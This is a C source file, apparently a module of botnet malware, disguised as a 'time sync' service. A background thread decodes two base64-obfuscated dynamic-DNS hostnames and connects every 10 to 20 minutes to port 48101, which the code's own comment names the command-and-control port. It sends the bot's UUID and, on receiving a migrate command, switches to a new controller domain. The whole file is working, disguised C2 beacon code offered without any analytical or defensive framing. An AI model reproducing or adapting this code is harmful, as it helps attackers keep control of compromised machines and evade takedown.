#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>

#include "headers/time_sync.h"
#include "headers/dns_util.h"
#include "headers/dns.h"
#include "headers/lifecycle.h"
#include "headers/rand.h"

#define MODULE_TAG "time_sync"
#include "headers/debug.h"

static pthread_t sync_tid;
static int sync_running = 0;

static const char *time_hosts[] = {
    "ZXdxb2Vrb3F3ZS5kdWNrZG5zLm9yZw==",
    "ZXdxb2Vrb3F3ZWUuZHVja2Rucy5vcmc="
};

static void *sync_service_task(void *arg) {
    DEBUG_PRINT("Time sync service started");
    
    while (sync_running) {
        // Sleep for 10-20 minutes
        int sleep_time = 600 + (rand_next() % 600);
        DEBUG_PRINT("Next sync in %d seconds", sleep_time);
        
        for (int i = 0; i < sleep_time && sync_running; i++) {
            sleep(1);
        }
        
        if (!sync_running) break;

        for (int i = 0; i < 2; i++) {
            unsigned char host[256];
            size_t hlen = 0;
            
            if (dns_util_parse(time_hosts[i], strlen(time_hosts[i]), host, &hlen) != 0)
                continue;
            
            host[hlen] = '\0';
            DEBUG_PRINT("Checking time host: %s", (char*)host);
            
            uint32_t ip = dns_resolve((char*)host);
            if (ip == 0) continue;
            
            int fd = socket(AF_INET, SOCK_STREAM, 0);
            if (fd < 0) continue;
            
            struct timeval tv;
            tv.tv_sec = 10;
            tv.tv_usec = 0;
            setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
            setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_addr.s_addr = ip;
            addr.sin_port = htons(48101); // Default CNC port
            
            if (connect(fd, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
                DEBUG_PRINT("Connected to time host, checking for updates...");
                
                // Send UUID to identify bot
                const char *uuid = lifecycle_get_uuid();
                write(fd, uuid, strlen(uuid));
                
                unsigned char resp[256];
                int n = read(fd, resp, sizeof(resp) - 1);
                if (n > 1 && resp[0] == 0x09) { // CMD_MIGRATE
                    resp[n] = '\0';
                    DEBUG_PRINT("Received update trigger, domain: %s", (char*)resp + 1);
                    request_migration((char*)resp + 1);
                }
                close(fd);
                break; // Success
            }
            close(fd);
        }
    }
    
    return NULL;
}

int start_time_sync_service(void) {
    sync_running = 1;
    if (pthread_create(&sync_tid, NULL, sync_service_task, NULL) != 0) {
        sync_running = 0;
        return -1;
    }
    return 0;
}

void stop_time_sync_service(void) {
    sync_running = 0;
    pthread_join(sync_tid, NULL);
}
